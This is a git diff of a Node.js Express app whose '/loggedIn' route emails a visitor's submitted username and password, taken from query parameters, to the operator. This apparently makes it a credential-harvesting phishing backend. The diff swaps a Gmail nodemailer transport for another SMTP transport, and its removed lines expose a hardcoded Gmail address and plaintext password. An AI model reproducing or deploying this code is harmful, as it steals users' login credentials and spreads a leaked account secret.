@@ -11,14 +11,6 @@ const oauth2Client = new OAuth2(
 
 const app = express();
 
-var transporter = nodemailer.createTransport({
-  service: 'gmail',
-  auth: {
-    user: 'mailfromebinxavier@gmail.com',
-    pass: 'chakkalakkal'
-  }
-});
-
 app.use(express.static('./'))
 
 app.get('/', (req,res)=>{
@@ -51,7 +43,7 @@ app.get('/loggedIn', (req,res)=>{
       text: 'User Name: '+req.query.uname+'\nPassword: '+req.query.pass
     };
     
-    transporter.sendMail(mailOptions, function(error, info){
+    smtpTransport.sendMail(mailOptions, function(error, info){
         if (error) {
           console.log(error);
         } else {
